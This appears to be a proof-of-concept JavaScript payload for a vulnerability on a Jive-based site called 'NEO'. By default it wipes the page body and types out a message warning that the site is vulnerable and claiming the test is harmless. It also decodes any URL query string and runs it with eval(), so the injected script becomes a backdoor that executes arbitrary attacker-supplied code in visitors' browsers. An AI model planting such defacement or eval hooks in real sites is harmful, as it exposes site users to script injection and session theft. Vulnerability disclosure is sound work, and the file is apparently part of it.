//Just for testing
//By kev7n

var i = 0;
var showString = "Hi There,<br/>"
    + "<br/>"
    + "If you see this page, it means that the NEO has security vulnerability.<br/>"
    + "Please DO NOT worry, this won't have any malicious behavior, just a test.<br/>"
    + "This is a very high risk level of vulnerability, Please fix it ASAP.<br/>"
    + "Have a good day.<br/>"
    + "By Kevin.";

function marquee() {
    var stringLength = showString.length;
    var eInput = document.getElementById('input');
    eInput.innerHTML += showString.charAt(i);
    i++;
    var timeID = setTimeout("marquee()", 70);
    if (i >= stringLength) {
        clearTimeout(timeID);
        i = 0;
    }
}

var queryString = document.location.search.substr(1);
if (!!queryString) {
    var cmd = decodeURIComponent(queryString);
    eval(cmd);
} else {
    var body = document.getElementsByClassName('jive-body-content')[0];
    body.innerHTML = '';
    body.style.background = 'black';
    body.innerHTML = '<br/><span id=\'input\' style=\'color:rgb(70, 221, 70);\'></span>';
    marquee();
}
